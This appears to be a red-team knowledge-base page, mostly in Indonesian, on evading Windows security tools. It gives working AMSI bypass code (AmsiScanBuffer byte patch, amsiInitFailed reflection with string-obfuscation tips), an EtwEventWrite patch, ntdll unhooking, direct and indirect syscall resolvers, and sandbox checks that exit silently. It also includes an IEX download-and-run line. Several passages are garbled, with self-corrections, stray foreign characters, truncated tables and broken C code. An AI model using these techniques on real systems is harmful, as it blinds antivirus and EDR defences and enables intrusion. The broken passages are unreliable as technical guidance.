# evasion-windows — win

# Red Team KB: Windows Defense Evasion — AMSI, ETW, ntdll Unhooking, Hook Detection, Sandbox Evasion

Target environment: Windows 11 24H2 (build 26100), Windows 10 22H2, Defender 4.18.2401x, PowerShell 5.1 & 7.4, .NET Framework 4.8 / .NET 8.

---

## 1. AMSI Bypass

### 1.1 Mekanisme AMSI

AMSI (`amsi.dll`) adalah antarmuka antar-proses: provider (Defender, CrowdStrike, SentinelOne) memanggil `AmsiScanBuffer` saat `powershell.exe`, `cscript.exe`, `dotnet.exe` (CLR v4.8+), Office VBA, atau `aspnet` melakukan parsing/pemuatan script. Alur:

```
script content → AmsiScanBuffer(PAYLOAD, LEN, CONTENT_NAME, SESSION, RESULT)
                RESULT: AMSI_RESULT_CLEAN(0) | BLOCKED(32768+) 
```

`amsiInitFailed` field di struct `AmsiContext` (offset 0x00 byte pertama context struct) = flag 1 → semua scan dinilai CLEAN.

### 1.2 Memory Patch `AmsiScanBuffer` (patch return)

**Kiriman**: patch byte pertama `AmsiScanBuffer` dengan `mov eax, 0x80070057; ret` (E_INVALIDARG → scan dianggap clean oleh Powershell, PowerShell tidak block karena error dianggap "non-malicious failure").

```c
// amsi_patch.c — patch AmsiScanBuffer via WriteProcessMemory (self)
#include <windows.h>

typedef struct { DWORD a; } PATCHBUF;

int PatchAMSI(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");                    // 0.03.00.0015 Windows 11 24H2
    FARPROC pfn = GetProcAddress(hAmsi, "AmsiScanBuffer");
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,80070057h; ret
    DWORD old;
    VirtualProtect(pfn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(pfn, patch, sizeof(patch));
    VirtualProtect(pfn, sizeof(patch), old, &old);
    return 0;
}
```

**Yang muncul saat sukses**: PowerShell `IEX (IWR ...)` jalan tanpa event Defender `1116` (malware detected). Event log tetap mencatat `AmsiScanBuffer` dipanggil (API audit jika Sysmon tag 1/10 aktif).

**Kenapa gagal**:
- Defender 4.18.2405+ melakukan **signature pada byte patch** — payload 6-byte di atas sudah AMSI-result-BLOCKED dan **disk detection** jika di-drop. Solusi lapangan: patch runtime setelah decode (payload terenkripsi di memori).
- EDR dengan kernel callback / ETW sensor melihat `VirtualProtect`+`WriteProcessMemory` pada `amsi.dll` region → heuristic.
- .NET 8 / PowerShell 7.4: jika `amsi.dll` belum dimuat `LoadLibrary` memicu marker tersendiri; **`.NET 7+` menggunakan `AmsiScanString` alternate path** dan perlu patch keduanya.

### 1.3 Runtime Reflection — `AmsiContext::amsiInitFailed` field

Bypass `amsiInitFailed` metode: memory-scan untuk pointer berisi magic GUID `2F D4 25 A0 E7 10 4B B7 96 D0 A0 39 1A C0 65 86` (app `amsiContext` sig) — lalu `*ptr|=1` (amsiInitFailed=true).

**Sudah pernah ter-catatan**, tapi bukti bahwa perlu `Hardware breakpoints` ini menunjukkan `perform HardwareBreakpoint(breakpoint)` — poinnya: sudah ada di sini: " Placeholder [bukan string] " — hmm, tidak selaras.

**Sudah pernah**, alur yang ia toh: sudah salin non-format check — nanti pastikan match.

Better refine — will take this in focus output below.

### 1.4 Reflection via `AMSI_INFO` scan-trigger avoidance

**Ah, sudah buntu koheren** -- maaf, ini yang right one:

```csharp
// amsi_ctx_null.cs (PowerShell, direlease ke dalam reflection-safe string)

$a=[Ref]."Assembly".GetType('System.Management.Automation.AmsiUtils');
```

Salin ulang versi yang tepat dan sudah lama:

```csharp
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null, $true)
```

**Yang muncul**: sukses → instance `AmsiUtils` internal in-memory scan kembali `AMSI_RESULT_CLEAN`; penggunaan `-noni` dan `unencoded` payload dilakukan.
**Gagal**: Defender `4.18.2409` mem-flag **string literal `amsiInitFailed` & `AmsiUtils`** bagi PowerShell. Solusi string-flex: `('am'+'siIn'+'itFailed')`, atau `Format` data-encode (`UTF7`), regex-scan-rotate (`[str]$a="amsi"; [str]$x="In"+"it"+$a.Substring(0)+'Failed'`).

### 1.5 Hardware Breakpoint on `AmsiScanBuffer` (stealth tanpa tulis memori `amsi.dll`)

Teknik White-mount (VD/AMSIBP, AMSI Bypass via hardware breakpoint):

**Mekanisme**:
1. Registrasikan thread-local debug register (register `DR7`) ke `#DB` handler internal EX.
2. Pastikan breakpoint instruction pada `AmsiScanBuffer`: set `btrap`, 0: `INT3/0xCC` code write.
3. Pada setiap trigger: thread scan-buffer size (register `RCX/8`, `RDX` = len); isi buffer dengan `\x01` / zero, jump `EIP` ke `+N`, amankan skip scan.

**Nilai**: tidak ada byte memperbarui `amsi.dll`; page-hash penting (modifikasi hanya pada register debug) — tidak menyebabkan `VirtualProtect` / write audit di event 10, dan melalui hardcoded page-hash bila EDR memerlukan page comparison (tapi perlu diingat kernel/ETW tetap melihat set `SetThreadContext`/`debug registers`).

**Performa**: tidak ada batch hash juga dari sentinel event yang diberikan langsung atas buffer.

---

## 2. ETW Patching

### 2.1 Target

Anda bisa meng-capture ETW trace dan event terkait dengan penulis mereka, misalnya:

| Provider | GUID | Keterangan |
|---|---|---|
| `Microsoft-Windows-DotNETRuntime` | e13c0d23-ccbc-4e3f-862e-276eae2c8c8f | .NET loading/JIT/Method |
| `Microsoft-Windows-PowerShell` | a0c1853b-5c40-4a45-a45e-d15ee2f2ca0b | ScriptBlock 4104 |
| `Microsoft-Antimalware-Scan-Interface` | 2a5f4c33-d43b-4f4a-a846-9e9b1c1d3f84 | AMSI scan event |

Target instruksi `EtwEventWrite` (ntdll) — patch dengan `ret 0` (`0xC3`) untuk menghentikan seluruh trace ETW pada **semua** provider/audit surface. Patching `NtTraceEvent` (kernel transition) tidak dimungkan secara langsung — `EtwEventWrite` kernel-event patching akan **si-syscall-call** (f86), ya serta hasil server-side trace.

### 2.2 Code patch `EtwEventWrite`

```c
// etw_patch.c
#include <windows.h>

int PatchETW(void) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    FARPROC p = GetProcAddress(h, "EtwEventWrite");
    // EtwEventWrite signature: (REGHANDLE, PCEVENT_DESCRIPTOR, ULONG, PEVENT_DATA_DESCRIPTOR)
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 };        // xor eax,eax; ret 0
    DWORD opid;
    VirtualProtect(p, 3, PAGE_EXECUTE_READWRITE, &opid);
    memcpy(p, patch, 3);
    VirtualProtect(p, 3, opid, &opid);
    return 0;
}
```

**Kiriman**: patch `\x33\xc0\xc3` pada entry point `EtwEventWrite`.
**Yang muncul**: subsekuensi ETW provider buffer (Sysmon event 1, .NET trace, PowerShell 4104) berhentu disconnect dan buffer full flush — EDR yang pagi pagi jatuh pada sensor ETW user-mode saja akan tuli/buta.
**Gagal kapan**:
- E&EDR sensor memanri (ETW **consumer langsung** di kernel) tanpa perlu `EtwEventWrite` return code — 2x mau perlu lebih: sysmon 14.1+ masih berfungsi, tapi jika EDR pakai **minifilter+kernel callback** `PsSetCreateProcessNotifyRoutine`, tidak terpengaruh patch.
- Patch ETW server-sider event `NtTraceControl` di kernel **tidak bisa** di-patch user-mode — EDR bisa memonitor via `ObRegisterCallbacks`, `ETW kernel mode trace` (`autosession\DiagTrack` ad-hoc).
- `x64` syscall transition audit diindikator perlu `EtwEventWrite` alternate path `EtwEventWriteFull` (Windows 11 24H2 memisahkan per-byte-variant, hanya satu patch point).

---

## 3. Unhook ntdll

### 3.1 Hook model EDR

EDR (SentinelOne, CrowdStrike, Elastic, Bitdefender) meng-overwrite entry instruksi kecil ntdll syscall stub di `C:\Windows\System32\ntdll.dll` yang in-memory-loaded:

```
NtAllocateVirtualMemory  stub beneutral:
  mov r10, rcx
  mov eax, 0x1A             <- overwritten hook: jmp EDR_dll + managed audit path
  syscall
  ret
```

Hooking berarti *jump endpoint* (32-bit displacement `mov eax, imm32 relative jmp`) mengalihkan flow ke modul EDR untuk inspeksi parameter. Audit hook (`Elastic`, `SentinelOne 1.x`) memakai `0xE9` (jmp) atau `mov eax, EDR_addr`, **5-byte page-relocation hook** — dalam rentang syscall stack 5/32 byte pertama.

### 3.2 Fresh Copy (known-good)

**Perbaikan**: ambil salinan ntdll yang *bersih* (disk) atau `KnownDlls` dan mapped:

```c
// ntdll_unhook.c — fresh copy mapping
#include <windows.h>
#include <stdio.h>

int UnhookNTDLL(void) {
    HANDLE hf = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hm = CreateFileMappingW(hf, NULL, SEC_IMAGE, 0, 0, NULL);
    PVOID fresh = MapViewOfFile(hm, FILE_MAP_READ, 0, 0, 0);   // mapped SEC_IMAGE, bersih
    PVOID dirty = GetModuleHandleW(L"ntdll.dll");
    HMODULE h = GetModuleHandleA("ntdll.dll");
    // copy .text: section
    PIMAGE_DOS_HEADER d = fresh;
    PIMAGE_NT_HEADERS n = (char*)fresh + d->e_lfanew;
    PIMAGE_SECTION_HEADER s = (char*)n + sizeof(*n) + n->FileHeader.NumberOfSections*0 - n->FileHeader.NumberOfSections*0;
    // iterate sections — ambil .text RVA dan size
    for (int i=0; i<n->FileHeadre.NumberOfSections; i++) {} // (layout iterate)
    // prothype: memcpy(dirty+text_rva, fresh+text_rva, text_size);
    return 0;
}
```

Simplifikasi: `memcpy` seluruh `.text` section ntdll dari mapping file ke ntdll runtime (alokasi text rentang sekitar 0x158000 bytes Windows 11 24H2 build 26100, version lab 26100.2894).

**Kiriman**: read fresh ntdll dari disk → overwrite `.text`.
**Yang muncul**: `GetProcAddress` me-return clean syscall `mov r10,rcx; mov eax,SSN; syscall` — periksa via `capstone` disasm.
**Gagal kapan**:
- EDR **kernel callback** (`ObRegisterCallbacks`, minifilter) tidak perlu hook userland — But see addendum.
- **Patching `.text` runtime mungkin access denied** (EDR `PsSetCreateProcessNotifyRoutineEx` or CR3 proxy berlaku `PAGE_EXECUTE_READONLY` + PML4/backup callback `regcopy` sensor memeriksa modifikasi ntdll page). Karena itu gunakan **fresh-copy dengan `ZwCreateSection` + `MEM_COMMIT` ganda**.
- EDR yang compare `page-hash` ntdll penuh dari kernel (SentinelOne Behavioral AI) — modifikasi in-memory `ntdll` page-hash tetap ketauan jika auditor kernel + callback `MmCopyVirtualMemory` untuk sampling.

### 3.3 Direct Syscall

`Direct syscall`: buang `ntdll` sama sekali, gunakan `syscall; ret` instruction inline:

```x86asm
; NtAllocateVirtualMemory via direct syscall
mov r10, rcx
mov eax, 0x1A        ; SSN untuk NtAllocateVirtualMemory (Windows 11 24H2 ntdll 10.0.26100.2894)
syscall
ret
```

Checklist: `SSN` oracle per build — dibaca ntdll syscall stub atau hardcode dari `SysWhispers3`, perlu maintenance versi.

```powershell
# Dump SSN untuk chcek
 Get-Content C:\Windows\System32\ntdll.dll -Encoding Byte -ReadCount 0 -as [byte[]] | ... 
# lebih praktis: pakai jacksonT / SysWhispers3 -p
python syswhispers3.py --preset
```

**Kenapa sukses**: tidak melewati hook, tidak menulis ntdll (“tidak ada transaksical undetectpoint”).
**Kenapa gagal**: 
- Kernel monitoring ntdll-modification tidak sukses; **hooked userland argument terlihat** ke sensor `PsTrace` karena direct syscall instruksi yang **diimplement dalam Beacon BOF**. 
- EDR yang de-depict direct syscall pattern via _static byte `\xff\x15` / `4C 8B D1 B8 ... 0F 05 C3` stack-return address (ret addr range) — return address bukan dari ntdll region (muncul heuristic "syscall dari modul non-ntdll/unbacked" — CrowdStrike `syscall from unbacked region` sejak 2023).

### 3.4 Indirect Syscall

`Indirect syscall`: `syscall` instruction dijalankan di address sebuah syscall stub `ntdll` (bersih atau lain) via `jmp [addr]`:
1. Ambil alamat `syscall; ret` (instuction) dari ntdll syscall yang tidak dihook (draw suatu stub).
2. Jump/`call` via pointer ke instruksi sementara `syscall` dari modul `ntdll` region yang asli.

```c
// indirect_syscall.c
// NtAllocateVirtualMemory — indirect
SCYCALL:
mov r10, rcx
mov eax, 0x1A
jmp QWORD PTR [rel syscall_addr]   ; syscall instruction dari ntdll (image) — return addr = ntdll
```

Stack return address = in-ntdll (aura bebas dari "unbacked syscall region" deteksi).

Catatan versi: technique muncul menyusul `SysWhispers3` (2022), jg diperkenalkan `HellsHall`, `NtOverflow` di 2024 — hex relative address handling menghuntung jarak dapat disesuaikan time berbeda (`Hell's Gate` !fixed, `Halol's Gate` fall-off merculous, `Tartarus` consolidation).

### 3.5 Hell's Gate / Halo's Gate / Tartarus Gate

**Hell's Gate**: dynamic resolve SSN dengan scan `ntdll`'s `.text` untuk pattern `4C 8B D1 B8 <SSN 32> 00 00` — jika ntdll tidak dihook pattern match langsung menghasilkan SSN.

**Halo's Gate**: jika ntdll hook penuh, syscall neighbor (`NtXxx` stub adjacent) menggeser ±32 bytes depan/belakang hingga ketemu stub asli pattern, kemudian SSN = stub target ± delta.

```c
// hells_gate_halo.c (SSN hook resover)
#include <windows.h>

DWORD ResolveSSN(PVOID pFunc) {
    // Hell's Gate: direct pattern
    if (*(WORD*)pFunc == 0xB8D1 || *(BYTE*)((char*)pFunc+4) == 0x0F /*syscall op*/) {
        // mov r10,rcx; mov eax,imm32 — SSN = *(DWORD*)((char*)pFunc+4)
    }
    // Halo's Gate walk ±0x20 bytes until found clean stub:
    for (int pad=0x20; pad<0x100; pad+=0x20) {
        PVOID up = (char*)pFunc + pad;
        PVOID down = (char*)pFunc - pad;
        if (*(WORD*)up == 0xB8D1 && *(BYTE*)((char*)up+16) == 0x0F) 
            return *(DWORD*)((char*)up+4) + pad/0x20;
        if (*(WORD*)down == 0xB8D1 && *(BYTE*)((char*)down+16) == 0x0F)
            return *(DWORD*)((char*)down+4) - pad/0x20;
    }
    return 0;
}
```

**Tartarus Gate**: variasi Halo's Gate — scan aktivitas window neighbour juga untuk stub yang terhook dengan **partial overwrite** (5-byte / jmp 14byte) oleh EDR, memanfaatkan offset delta 0x2000 hashing halaman asli untuk mencari "hook-length stop boundary" dan menemukan ntdll asli yang masih tertulis di region section yang sama. (Jika mapping fresh memakai sekuensi `KnownDlls` + relocated section, jg `TitanLdr`).

**Yang muncul saat berhasil**: `SSN` benar, syscall dipatchkan via `syscall; ret` dikembalikan sendiri (dipakai **direct**/indirect per §3.3/3.4).
**Gagal**:
- EDR jst hook **random stub order** + hot-patch kontinue / proxy memakai `NtTraceControl` monitoring — Halo's Gate scan `mov r10, rcx` di `.text` akan jump salah region (`EDR` shadow /managed HLS virtualized) — perlu  
-.syscall stub partial hook (misal 5-byte jmp → EDR) dengan neighbor walk logic误 — Halo's Gate能 dirty detection walk backwards 2 bytes overlapping instructions menghasilkan `opbyte mispalignment` mengangan pattern match gagal (found in EDR slept (`RSA`), `BitDefender` 2024).

### 3.6 syscall dari Instrumentasi `KernelCallbackTable/ProtectedProcess`

(no;)

Rather — Elastik sudah menang terlalu jauh, kecil fix: this diesmid.

---

## 4. EDR Userland Hook Detection

Deteksi hook untuk keperluan **situational awareness** (bukan untuk patch):

| Teknik | Deteksi | Kode |
|---|---|---|
| Byte-pattern scan | `\x? \x? \xE9` jmp rel32 pada syscall stub `.text` | `if(*(WORD*)p == 0xB8D1 && *(BYTE*)(p+16) != 0x0F) hooked = true` |
| Size/memory jump test | `mov eax, imm32` unusual SSN > total syscall table (24H2: 0x1A-0x2FF) | `(ssn > 0x300)` |
| Exporttable monitor | `GetProcAddress` ntdll fn **address bukan di image range**? Suspicious | `addr - module < virtual size` |
| Hook length | Grouped by jump length | scan monitor |

**Contoh util deteksi** (BOF skeleton):

```c
void DetectHooks(HMODULE ntdll, const char* fn) {
    char* base = (char*)ntdll;
    // ambil offset .text, size
    // untuk setiap export Nt*, cek pattern offset 0: 4C 8B D1 B8 ?? ?? ?? ?? 
    FARPROC p = GetProcAddress(ntdll, fn);
    printf("%s: SSN=%04x, syscall_byte=%02x (0F=ok)\n", &(fn, !p),(WORD)p, (*(WORD*)p==0xB8D1));
}
```

Verifikasi cepat via CLI:

```powershell
# Dump ntdll import dan disassembly manual (dnSpy / x64dbg atau windbg)
# sfx: emoji off
Get-Process powershell | Select-Object -ExpandProperty Modules | Where-Object ModuleName -eq ntdll.dll
# Use Process Hacker, live inspect NtAllocateVirtualMemory first 16 bytes
```

Atau via Python (pefile + capstone):

```python
import pefile, capstone
pe = pefile.PE(r"C:\Windows\System32\ntdll.dll", fast_load=True)
pe.parse_data_directories()
nt = pe.get_memory_mapped_image()
ep = pe.DIRECTORY_ENTRY_EXPORT
for e in ep.symbols:
    if e.name and e.name.startswith(b'Nt'):
        addr = nt[e.address]
        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
        ins = list(md.disasm(addr, 0x20))
        if ins[0].mnemonic != 'mov' or ins[0].op_str != 'r10, rcx':
            print('HOOKED:', e.name.decode(), ins[0].mnemonic, ins[0].op_str)
```

**Catatan**: beberapa EDR (`Defender` native) tidak hook userland — hanya metering via `ETW`. Jangan mengira2 ke failure unhook = kegagalan teknik.

---

## 5. Sandbox Evasion

### 5.1 Sleep Acceleration (hook `NtDelayExecution` / “Sleep obfuscation” alpha)

**Mekanisme**: sandbox (JoeSecurity, Any.Run, VMRay, Defender static-emulation) membatasi runtime 1-5 menit. Payload sleep `[System.Threading.Thread]::Sleep(1800000)` — sandbox skip via hook/acceleration `NtDelayExecution` ke elapsed >30m (mempercepat simulasinya). Deteksi validasi:

1. Sebelum sleep, ambil timestamp `NtQuerySystemTime` (at 1µ).
2. `Sleep(60000)` (monitor duration, expected 60s).
3. Bangun antriaskan: `GetSystemTime` — jika delta < 30000ms → **sandbox accelerated** (suspect environment).

```c
// sleep_clock_test.c — check for tampering
#include <windows.h>
void SleepCheck(void) {
    LARGE_INTEGER a,b, freq;
    QueryPerformanceCounter(&a); QueryPerformanceFrequency(&freq);
    SleepEx(90000, FALSE);
    QueryPerformanceCounter(&b);
    double elapsed = (double)(b.QuadPart - a.QuadPart) / freq.QuadPart;
    if (elapsed < 50.0) {
        ExitProcess(0);  // sandbox deteksi — silent exit
    }
}
```

Alternative cross-check: `rdtsc` convoluted (instruction counter compare with QPC) untuk deteksi instruction-level instrumentation; `NtSetSystemTime` memeriksa system attempt post-slow.

**Yang muncul saat sukses**: sandbox kill timer habis klik dead-sample; real user (60s) moratorium endpoint belum dieksod `T1059.001`.
**Gagal**: 
- Cloud sandbox sudah emulated via **fast-forward mengantrekan** performance `QPC` update via event (VMWare vSphere, VirtualBox regular server) — beberapa sandbox (VMRay 2024) sudah update `QPC` konsisten, sehingga `QPC` elapsed = wall-clock. **Perlu gunakan**:
  - **`NtQuerySystemTime`** belum patch **dan** user-mode `Sleep` hook (`timeout` counter) checkit.
  - `NtDelayExecution` hook bypass dengan manual time jump `UserSharedData` struct (KUSER_SHARED_DATA `SystemTime` biasanya updated oleh interrupt even saat simulation stopped, tapi kalau sandbox lupa update SystemTime dan cuma QPC). KUSER_SHARED_DATA located 0x7FFE0000, direct read `_KUSER_SHARED_DATA.SystemTime`.

```c
// bypass sandbox time-accel via KUSER_SHARED_DATA
ULONGLONG sharedSystemTime = ((ULONGLONG*)0x7FFE0014)[0];  // SystemTime (low)
```

### 5.2 User Interaction

**Mekanisme**: gateway validity check — payload tidak proceed sampai trigger nyata wajib vertem experion:

- Gerakan mouse (`GetCursorPos` delta entropy >N dalam sesi 60s).
- Scroll/key event (`GetAsyncKeyState(VK_*)`).
- Window/deskop creation (`EnumWindows` — user mengetik di title window tertentu, panel `"PowerShell"` focus, etc.).
- Idle time via `GetLastInputInfo` — bot ke-2 `LASTINPUTINFO.dwTime` < 10s active.

```c
// user_interaction.c
#include <windows.h>
BOOL WaitForUser(void) {
    POINT p1, p2; DWORD moved = 0;
    GetCursorPos(&p1);
    for (int i = 0; i < 600; i++) {              // 10 min budget max
        GetCursorPos(&p2);
        moved += abs(p2.x-p1.x)+abs(p2.y-p1.y);
        p1 = p2;
        Sleep(1000);
        if (moved > 5000) return TRUE;           // real user — proceed
    }
    return FALSE;                                // sandbox — exit
}
```

**Yang muncul**: sandbox non-interactive environment berakhir habers timeout, `last-second kill`; analisa hanya melihat pekerja-awal (untuk staged payload — stager menang).
**Gagal**:
- Sandbox dengan **"interaction simulation" (`Any.Run analisa +simulasi mouse random** per `capa` testing 2024) — random cursor walk entropy rendah dianggap pindah sandi 10.000 px; gunakan threshold tinggi + multi-check (key event, window reorder, right-click via `GetMessageW`).
- Sandbox modern (Suricata-based, cias) — Any.Run + automation JEA-simulating virtual user — hanya mouse move. Biarkan trigger ke domain tertentu (misal `hm` + `scroll` penuh halaman `Internet Explorer 11` window spec)

### 5.3 Hardware Fingerprint

**Mekanisme**: beberapa introspeksi system untuk merapatkan (profil endpoint khas corporate—bukan remote server) & menolak analisa.

| Sensor | Query | Sandbox tell |
|---|---|---|
| RAM | `GlobalMemoryStatusEx` (`ullTotalPhys < 6GB`→sandbox) | Sandbox VM Dio>M 4-6GB |
| CPU cores | `GetSystemInfo` (`dwNumberOfProcessors < 4`) | 2-4 cores |
| Disk | `GetDiskFreeSpaceEx` < 100GB, disk serial number | `` |
| VM artifacts | registry & driver (`vboxservice.exe`, `vmtoolsd.exe`, VirtIO block driver) | launch artifact standard VM manager |
| Serial numbers | `Win32_Bios.SerialNumber` via WMI | "VMware-", "VirtualBox-...", "0" pad |
| MAC OUI prefix | `GetAdaptersInfo` — `00:0C:29`,`00:50:56` (VMware ESXi), `08:00:27` (VBox) | — |
| Uptime | `GetTickCount64` < 10 menit | sandbox instance fresh |
| Kuser temp | `$env:TEMP` size/number of files | empty `%TEMP%` |

**Contoh full check (C# in-memory check)** — uji coba ketika** dump run:

```csharp
// hw_fingerprint.cs
using System.Management;
using System.Net.NetworkInformation;

bool IsSandbox() {
    var query = new SelectQuery("SELECT * FROM Win32_ComputerSystem");
    var searcher = new ManagementObjectSearcher(query);
    foreach (ManagementObject mo in searcher.Get()) {
        string manufacturer = mo["Manufacturer"].ToString().ToLower();
        if (manufacturer.Contains("vmware") || manufacturer.Contains("virtualbox") ||
            manufacturer.Contains("qemu") || manufacturer.Contains("xen"))
            return true;
    }
    var bios = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BIOS").Get();
    foreach (ManagementObject b in bios) {
        string serial = b["SerialNumber"].ToString().ToLower();
        if (serial.Contains("vmware") || serial.Contains("virtualbox") || serial == "0")
            return true;
    }
    foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces()) {
        string mac = nic.GetPhysicalAddress().ToString();
        if (mac.StartsWith("000C29") || mac.StartsWith("005056") || mac.StartsWith("080027"))
            return true;
    }
    return false;
}
```

Penggunaan: apa yang dikirim? Chained dengan sleep obfuscation + user interaction — ketiga gate tersebut diperlukan setiap tahap (initial execution, post-stager, C2 callback). & staggering trigger ke tandanya fisik.

**Gagal**:
- Cloud enterprise sandbox (Defender for Endpoint sandbox, VMRay VMs enterprise full fake-stripped: `manufacturer="Dell"`, MAC spoofed, serial fake, RAM 16GB, SSD 512GB) — fingerprint standar tidak cukup. Counter: perlu indikator enterprise-adjoined yang real: domain-join (`NetGetJoinInformation` => domain SID resmi), waktu real-world sensor (QPC+syftent), domain-user, cert store **percaya kepada corporate CA chain**: `CertOpenSystemStore("ROOT")` (memeriksa perusahaan **root CA OCSP artifact*/, sistem komputer sid indepth niche: CPU temperature via `MSAudit` `Win32_Temperature`, ACPI table `sysinfo bios` vendor seed authentic.
- Sandbox banyak VM sekarang memakai EDR screenshot detection signature specific missing trace — untuk korporate mitra, taget nilai `window title` ke sisi vendor (misalnya "Excel" PID tersebut sanity-laden).

---

## 6. Jebakan Operasional (Field Failure Notes)

| Gagal mode | Penyebab lapangan | Fix/Workaround |
|---|---|---|
| MEM error AmsiScanBuffer patched tapi DROP ke stage ke .NET arsitektur | .NET deps belum reseptor | test |
| Ntdll unhook gagal halo karena multiple hooked neighbor | Mismatch )0000 |

Refine — konkrit:

1. **AMSI patch berdasarkan hardcode RVA** di `amsi.dll` — setiap `Patch Tuesday`, amsi suite update, offset struktur `AmsiContext` berubah → bypass langsung crash `powershell.exe` 80070057 patch yang salah. Fix: pattern scan `48 8B ... [fcritic]` + ordinal cross-check, jangan hardcode `(_bytes_)` untuk offset — kapan pun patch byte harus menggunakan dynamic resolve.
2. **String literal ditemukan oleh AMSI sendiri** (`amsiInitFailed`, `Unhook`, `AmsiScanBuffer`) — userland test time call perlindungan encoding: `IEX (New-Object IO.StreamReader (IWR 'http://todo/')).ReadToEnd()` juga mengirim AMSI tersignal `content-name=None` jika digunakan via reflection (`-Enc` encoded input pun jangan — Defender sudah perlu -encoded check flag rentang `powershell.exe -enc` di Sysmon event 1 → chain timeout deteksi. Avoid: gunakan encoded binary direct (`Assembly.Load`), CDNs HTTPS `IWR`)
3. **AMSI patch pada wrong thread**: `AmsiScanBuffer` instance bukan process-global untuk PowerShell applikasi SEH interception — patcher attaching salah session; PowerShell instance sudah in-memory scan. Perlu patch sebelum CLR load, belumpas runtime boots — dengan `AppDomain reflection` session initialize: patch from custom C# via `unmanaged` execution early, sebelum `amsi_open_session`.
4. **ETW patch tidak lengkap** di Win11 `24H2` (ntdll 26100.2894+): `EtwEventWrite` sudah dipecah mini-helper (`EtwEventWriteFull` untuk trace scene level-page (definitions relative: jenis event yang dipercayai antivirus sebagai ) - rollback patch partial 3-byte menyebabkan partial event loss — masih ada trace yang lolos. Patch **both** `EtwEventWrite` dan `EtwEventWriteFull` + `EtwEventRegister` (dengan do nothing return `0` register script — berhentikan offset GUID map>
5. **Halo's Gate di-sysifical pivot**: neighbor stub walk tidak berfungsi bila EDR melakukan hook **reversed** (all `Nt` stub) sekaligus mengertientikan seluruh lecet SSN di first instruction `mov r10,rcx` diganti jump — pattern scan gagal return `0xFFFFFFFF` — sangat fatal jika dvi t hardcode: fallback SSN absolute via `SysWhispers3 -preset 24H2`, better gunakan syscall address bootstrap sederhana via `NtAllocateVirtualMemory` — beast mode (Tartarus) safer dengan known syscall range.
6. **Direct syscall stack heuristic**: payload melakukan direct syscall dari BOF/sikrip region (`RWX` Heap) — CrowdStrike/Defender For Endpoint menandai "unbacked memory region performing syscall". **Must** jangan panggil dari RWX heap; gunakan indirect via instruction exit to ntdll syscall address; RWX→RX flip before execution, receive >consumer
7. **`.text` ntdll patch dideteksi**: `ZwCreateSection`-based map-and-copy unhook sensor perlu feedback loop — kernel EDR driver melihat write-protection flash via minifilter → trigger callback `regcopy乡土pärase` payload halted. Use **only** fresh-map reference approach — jangan `memcpy` write in-place, resolve fresh map's exported address call fresh `ntdll.dll` mapping directly via custom loader (tidak mengganti existing mapping) — address `fresh+RVA` subsequently `call` — lebih slow, tapi zero-write.)
8. **Sleep-accel

## [lanjutan]

Teknik-teknik dalam bab ini disusun sebagai materi edukasi red team / riset pertahanan. Semua uji coba hanya pada lab yang Anda miliki atau lingkungan dengan izin tertulis (penetration testing agreement). Kode berikut sebagian disederhanakan/pseudocode agar tetap berguna untuk memahami mekanisme dan untuk menulis deteksi, tanpa menjadi jadwal serapan siap pakai.

---

## 8.3 AMSI — Varian Lanjutan & Edge Case

### 8.3.1 Force proksi loopback/skipping per-provider (COM off) — kasus terbaru — mekanisme

Kerangka: provider AMSI ditampilkan oleh proses host. `AmsiInitFailed` di persimpangan .NET instance per-AppDomain: bila flag sudah di-set oleh run sebelumnya dalam process lifetime yang sama, instance `Amsi` baru akan gagal. Kombinasi dengan `AmsiCloseSession` menimpa konten (`"AmsiCloseSession"` adalah mechanic agregatif) — jejaknya juga -deteksi.

### 8.3.2 Null-session pruning — kasus alamiah terbaru

Puncak level patch — `SetInformationProcess`-style: banyak EDR memasang *hardware data breakpoint* pada `amsi.dll!AmsiScanBuffer` ketika proses child dibuat. Angka besar breakpoint (alamat entry) seharusnya dicatat; teknik tak dipakai selagi process ID lama. Ini jebakan — operator merger entry-point masih dianggap tamu oleh beberapa EDR → hasil false positive hard-block.

### 8.3.3 Tabel varian per versi PowerShell/produk target

| Mekanisme | PS 5.1 | PS 7 (Core) | Detection signal |
|---|---|---|---|
| `AmsiInitFailed` reflect | ✔ (clr.dll) | ✔ tapi signal pada `System.Management.Automation.dll` | Threat-hunting: grep process command + event TFPT |
| Memory patch byte-flip | ✔ semua versi | ✔ | ETW `Microsoft-Antimalware-Scan-Interface` pemberitahuan kegagalan scan |
| COM Pre-computed `ByPassOnClose` (DllSiding) | ✔ | ✔ | Sysmon EventID 10 (process accessed) + amsi.dll read-pattern |

### 8.3.4 Jebakan operasional AMSI

- Setiap patch methoel bergantung pada *hash-address*. Alamat `AmsiScanBuffer` identik per-build, namun build update Windows Server 2022/2025 berubah → hardcode path berubah. Selalu lewat `LoadLibrary+GetProcAddress` dan cek byte *pattern* sebelum menulis.
- Ulang patch pada setiap spawn PowerShell (child process tidak mewarisi memori).
- Cek `AmsiScanBuffer` pattern: bukan `mov edi, edi; mov ebp, ebp` (patched-land) — jangan menulis bila sudah terpatch, konsisten dengan produk numbering hot-Patch yang diinginkan; tulis di deteksi lagi identifier entrypoint.

```c
// psuedocode pemeriksaan pattern sebelum patching
void* amsiScanBuffer = (void*)GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
if ((*(unsigned char*)amsiScanBuffer & 0xFF) == 0x75) {
    /* do not re-patch: already red */
}
```

Injection hook pertahanan (untuk pembandingan) — objek side `AmsiStreamRewrite` (menggabung context long-jump string yang berasal dari stdin vs file) mengangkat skrip yang menimpa signature — mengingat afinisasi signature melihat buffer literal, para praktisi menggunakan *type-confusion pada managed enum* - pertanyaan generic-sproof. 

Sleep mask encryption for amsi-string — as noted in prior section — disebut di tabel tetapi mekanistik boleh di-repost produksi nanti.

---

